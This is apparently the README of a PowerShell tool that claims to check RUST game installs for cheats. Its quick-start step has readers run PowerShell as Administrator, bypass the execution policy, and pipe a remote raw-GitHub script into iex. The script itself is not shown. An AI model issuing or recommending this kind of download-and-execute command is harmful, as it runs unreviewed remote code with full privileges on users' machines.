# Rust Client Quick Integrity Checker 🔍

[![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-blue.svg?style=for-the-badge&logo=powershell)](https://docs.microsoft.com/en-us/powershell/)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg?style=for-the-badge)](https://www.microsoft.com/windows)
[![Status](https://img.shields.io/badge/Status-Proof_of_Concept-yellow.svg?style=for-the-badge)](https://en.wikipedia.org/wiki/Proof_of_concept)
[![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)

**A lightweight PowerShell tool for quick scanning of the RUST game client for potential unauthorized software traces.**

This repository contains a PowerShell script designed for rapid, surface-level scanning of **RUST** game files and environment to detect inconsistencies and "red flags" that *may* indicate the presence of cheats or macros.

&gt; **⚠️ Important Notice:** This tool is a **Proof of Concept (PoC)** intended for basic visual inspection. It is not a full-fledged anti-cheat solution and does not guarantee 100% detection. Its primary purpose is quick preliminary analysis.

## 🚀 Quick Start

Run the checker with a single command in PowerShell.

**Prerequisite:** Launch **PowerShell as Administrator**.

Copy and execute the following command:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://raw.githubusercontent.com/WarRagon404/RustCheatChecker/refs/heads/main/main.ps1' -UseBasicParsing).Content
```

**⚖️ Disclaimer**

This tool is created for educational and research purposes only.

Use at your own risk. The author is not responsible for any consequences, including false positives.

This tool does NOT provide definitive proof of cheating. Any suspicions require additional manual verification.

Game updates and cheating methods evolve constantly. The script may become outdated.
